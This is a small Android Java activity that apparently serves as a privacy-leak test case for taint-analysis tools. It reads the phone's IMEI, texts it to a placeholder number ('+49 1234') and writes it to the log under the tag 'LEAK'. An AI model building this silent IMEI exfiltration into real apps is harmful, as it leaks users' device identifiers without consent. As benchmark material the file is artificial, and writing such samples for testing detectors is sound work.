package de.mo;

import android.app.Activity;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Log;

public class MainActivity extends Activity {
	String secret = "";

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_button2);

		TelephonyManager mgr = (TelephonyManager) this.getSystemService(TELEPHONY_SERVICE);
		secret = mgr.getDeviceId();
		OtherActivity.secret = secret;

		final SmsManager sm = SmsManager.getDefault();
		String send = "IMEI: " + secret;
		sm.sendTextMessage("+49 1234", null, send, null, null);
		doSomething(secret);
	}

	private void doSomething(String s) {
		Log.d("LEAK", s);
	}

	@Override
	protected void onPause() {
		TelephonyManager mgr = (TelephonyManager) this.getSystemService(TELEPHONY_SERVICE);
		String imei = mgr.getDeviceId();
		Log.d("LEAK", imei);
	}
}
